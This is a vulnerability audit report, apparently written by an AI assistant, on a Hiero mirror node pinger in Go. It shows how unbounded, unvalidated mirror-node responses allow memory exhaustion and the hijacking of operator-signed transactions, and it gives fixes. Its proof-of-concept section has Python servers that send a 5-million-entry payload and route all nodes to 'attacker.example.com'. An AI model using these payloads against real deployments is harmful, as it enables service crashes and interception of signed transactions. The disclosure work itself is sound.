After reading the actual source code, all line references and behavioral claims in the report are accurate. Here is the audit result:

---

Audit Report

## Title
Unbounded Mirror Node Response Accepted Without Size or Address Validation in `fetchMirrorNodeNetwork()`

## Summary
`fetchMirrorNodeNetwork()` in `pinger/mirror_node_client.go` decodes the HTTP response from a configured mirror node into a `nodesEnvelope` struct with no body-size cap, no limit on the number of `Nodes` or `ServiceEndpoints`, and no validation of returned host/IP values. When `network=other` is configured, the resulting unvalidated address map is passed directly to `hiero.ClientForNetwork()`, after which `client.SetOperator()` binds the operator's private key to a client whose node list is entirely mirror-node-supplied.

## Finding Description

**Exact code path — `pinger/mirror_node_client.go`, `fetchMirrorNodeNetwork()`, lines 74–132:**

The response body is decoded with no `io.LimitReader` wrapper: [1](#0-0) 

A response body of arbitrary size is fully consumed into memory. The only guard before an address is added to the network map is an empty-string / zero-port check: [2](#0-1) 

There is:
- No cap on `len(payload.Nodes)` (line 102)
- No cap on `len(n.ServiceEndpoints)` (line 113)
- No allowlist or format validation of `host` values — RFC-1918 addresses, loopback (`127.0.0.1`), and attacker-owned domains are all accepted
- No HTTPS enforcement; the documented example URL is `http://mirror-rest:5551` [3](#0-2) 

The resulting `network` map flows directly into `hiero.ClientForNetwork(netmap)` and then `client.SetOperator(opID, opKey)` in `pinger/sdk_client.go`: [4](#0-3) 

**Root cause:** Blind trust of the mirror node HTTP response with no size bound, no entry-count limit, and no address validation before the data is used to configure a credentialed SDK client.

**Failed assumption:** The code implicitly assumes the mirror node is a trusted, well-behaved source. No secondary validation step exists before the returned addresses are used.

## Impact Explanation

1. **Memory exhaustion / OOM**: A single crafted response containing millions of node entries causes the Go process to allocate unbounded memory, crashing the pinger pod. The `http.Client` timeout (`mirrorNodeClientTimeout`, default 10 s) limits streaming time but does not bound the decoded in-memory size.

2. **Transaction routing hijack**: The SDK client selects gRPC endpoints from the attacker-supplied map. Every periodic transfer — signed with the operator's private key — is submitted to attacker-controlled infrastructure. The attacker receives fully-signed transaction bytes, can observe them, selectively drop them (liveness DoS), or replay them to the real network at a chosen time.

3. **No secondary approval for endpoint selection**: The operator configured a mirror node URL, not individual consensus node addresses. There is no step between "mirror node returned these addresses" and "SDK client uses these addresses with the operator key."

## Likelihood Explanation

The `network=other` mode is explicitly designed for non-standard deployments where the operator supplies a custom mirror node URL. In such environments:

- The HTTP channel is commonly unencrypted (`http://`), making MITM feasible for any on-path actor (same Kubernetes namespace, compromised sidecar, cloud VPC route injection).
- DNS poisoning of the hostname in `mirrorRest` requires no credentials on the target system.
- A supply-chain compromise of the mirror node service itself (a separate, lower-privilege component) is sufficient.
- The attack is repeatable on every pinger restart because `buildNetworkFromMirrorNodes` is called fresh each time `newClient` is invoked. [5](#0-4) 

## Recommendation

1. **Cap response body size** — wrap `resp.Body` with `io.LimitReader` before decoding:
   ```go
   const maxBodyBytes = 1 << 20 // 1 MiB
   if err := json.NewDecoder(io.LimitReader(resp.Body, maxBodyBytes)).Decode(&payload); err != nil { ... }
   ```
2. **Limit entry counts** — enforce a maximum on `len(payload.Nodes)` and `len(n.ServiceEndpoints)` after decoding.
3. **Validate host values** — reject loopback addresses, RFC-1918 ranges, and optionally enforce a domain/IP allowlist before adding entries to the network map.
4. **Enforce HTTPS** — reject `mirrorRest` URLs that do not use `https://` when `network=other`, or at minimum warn loudly and document the risk.
5. **Consider response signing / HMAC** — for deployments where the mirror node is operator-controlled, a shared secret or TLS client certificate can authenticate the response.

## Proof of Concept

**Memory exhaustion:**
```python
# Serve this JSON from a local HTTP server pointed to by HIERO_MIRROR_PINGER_REST
import json, http.server, socketserver

PAYLOAD = json.dumps({
    "nodes": [
        {
            "node_account_id": f"0.0.{i}",
            "service_endpoints": [{"domain_name": "attacker.example.com", "port": 50211}]
        }
        for i in range(5_000_000)  # 5 million entries
    ],
    "links": {"next": None}
})

class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(PAYLOAD.encode())

socketserver.TCPServer(("", 5551), H).serve_forever()
```

**Transaction routing hijack:**
```python
# Return a small, valid-looking response pointing all nodes at attacker infrastructure
PAYLOAD = json.dumps({
    "nodes": [
        {"node_account_id": "0.0.3",
         "service_endpoints": [{"domain_name": "attacker.example.com", "port": 50211}]},
        {"node_account_id": "0.0.4",
         "service_endpoints": [{"domain_name": "attacker.example.com", "port": 50211}]},
    ],
    "links": {"next": None}
})
```

With `HIERO_MIRROR_PINGER_NETWORK=other` and `HIERO_MIRROR_PINGER_REST=http://<mock-server>:5551`, the pinger will build a client whose entire node map points to `attacker.example.com:50211`. All subsequent signed transfers are sent there.

### Citations

**File:** pinger/mirror_node_client.go (L95-98)
```go
	var payload nodesEnvelope
	if err := json.NewDecoder(resp.Body).Decode(&payload); err != nil {
		return nil, false, fmt.Errorf("decode mirror nodes: %w", err)
	}
```

**File:** pinger/mirror_node_client.go (L113-123)
```go
		for _, ep := range n.ServiceEndpoints {
			host := strings.TrimSpace(ep.DomainName)
			if host == "" {
				host = strings.TrimSpace(ep.IPAddressV4)
			}
			if host == "" || ep.Port == 0 {
				continue
			}

			addr := net.JoinHostPort(host, fmt.Sprintf("%d", ep.Port))
			network[addr] = nodeAccountId
```

**File:** pinger/config.go (L37-37)
```go
	flag.StringVar(&cfg.mirrorRest, "mirror-rest", envOr("HIERO_MIRROR_PINGER_REST", ""), "mirror node REST base URL (required for other), e.g. http://mirror-rest:5551")
```

**File:** pinger/sdk_client.go (L17-45)
```go
	case "other":
		netmap, err := buildNetworkFromMirrorNodes(context.Background(), cfg)
		if err != nil {
			return nil, err
		}
		client = hiero.ClientForNetwork(netmap)

	case "testnet", "previewnet", "mainnet":
		c, err := hiero.ClientForName(cfg.network)
		if err != nil {
			return nil, err
		}
		client = c

	default:
		return nil, fmt.Errorf("unknown network %q (testnet|previewnet|mainnet|other)", cfg.network)
	}

	opID, err := hiero.AccountIDFromString(cfg.operatorID)
	if err != nil {
		return nil, fmt.Errorf("invalid operator id: %w", err)
	}

	opKey, err := hiero.PrivateKeyFromString(cfg.operatorKey)
	if err != nil {
		return nil, fmt.Errorf("invalid operator key: %w", err)
	}

	client.SetOperator(opID, opKey)
```
